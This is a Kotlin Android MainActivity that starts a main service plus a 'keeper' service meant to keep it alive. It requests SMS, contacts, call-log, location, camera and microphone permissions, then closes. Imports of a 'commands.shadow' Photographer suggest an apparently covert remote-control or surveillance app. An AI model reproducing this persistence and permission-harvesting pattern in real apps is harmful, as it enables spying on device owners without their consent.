package com.hc.calling

import android.Manifest
import android.content.Intent
import android.os.Bundle
import android.support.v7.app.AppCompatActivity
import com.hc.calling.callingtransaction.R
import com.hc.calling.commands.shadow.util.Photographer
import com.hc.calling.util.DensityUtil
import com.hc.calling.util.PermissonUtil


class MainActivity : AppCompatActivity() {

    companion object {
        val SPF_NAME = "density"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        //start two services for keep the mainly service alive
        val intent = Intent(this, MainService::class.java)
        val intent2 = Intent(this, KeeperService::class.java)
        startService(intent)
        startService(intent2)

        Photographer.size["width"] = DensityUtil.getWindowMetrics(this, DensityUtil.WIDTH)
        Photographer.size["height"] = DensityUtil.getWindowMetrics(this, DensityUtil.HEIGHT)

        //request the permissions
        if (PermissonUtil.requestPermisson(
                this,
                arrayOf(
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO
                ),
                10000
            )
        ) {
            finish()
        }


    }

}
